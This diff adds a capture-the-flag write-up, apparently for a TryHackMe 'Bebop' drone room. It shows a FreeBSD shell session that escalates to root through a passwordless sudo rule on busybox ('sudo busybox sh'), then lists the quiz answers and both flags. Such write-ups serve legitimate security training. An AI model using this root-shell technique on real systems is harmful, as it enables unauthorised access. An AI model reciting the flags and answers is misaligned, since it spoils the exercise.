@@ -74,3 +74,80 @@ Welcome to FreeBSD!
 
 Release Notes, Errata: https://www.FreeBSD.org/releases/
 Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+Edit /etc/motd to change this login announcement.
+To determine whether a file is a text file, executable, or some other type
+of file, use
+
+        file filename
+                -- Dru <genesis@istar.ca>
+[pilot@freebsd ~]$ uname
+FreeBSD
+[pilot@freebsd ~]$ ls
+user.txt
+[pilot@freebsd ~]$ cat user.txt
+THM{r3m0v3_b3f0r3_fl16h7}
+
+priv esc
+busybox gtofbins
+
+[pilot@freebsd ~]$ sudo -l
+User pilot may run the following commands on freebsd:
+    (root) NOPASSWD: /usr/local/bin/busybox
+[pilot@freebsd ~]$ sudo busybox sh
+```
+```text
+# uname
+FreeBSD
+```
+```text
+# cd /root
+```
+```text
+# ls
+.bash_history   .history        .login          root.txt
+.cshrc          .k5login        .profile
+```
+```text
+# cat root.txt
+THM{h16hw4y_70_7h3_d4n63r_z0n3}
+```
+What is the User Flag?
+Enumerate the machine using nmap. Are there any interesting services running on the drone?
+What is the Root Flag?
+What commands can you run as root?
+### Quiz!
+Pssst!
+Hey! Guess what! QUIZ TIME!
+What is the low privilleged user?
+Username
+*pilot*
+What binary was used to escalate privillages?
+*busybox*
+What service was used to gain an initial shell?
+*telnet*
+What Operating System does the drone run?
+*FreeBSD*
+### Closing words
+Bebop is a room based on the Parrot Bebop drone and takes heavy inspiration from the recollection of the DEFCON 23 talk "Knocking my neighbors kids cruddy drone offline".
+
+## Flags / Answers
+- ***THM{r3m0v3_b3f0r3_fl16h7}***
+- ***THM{h16hw4y_70_7h3_d4n63r_z0n3}***
+
+## Notes / Lessons Learned
+[[ToolsRus]]
+
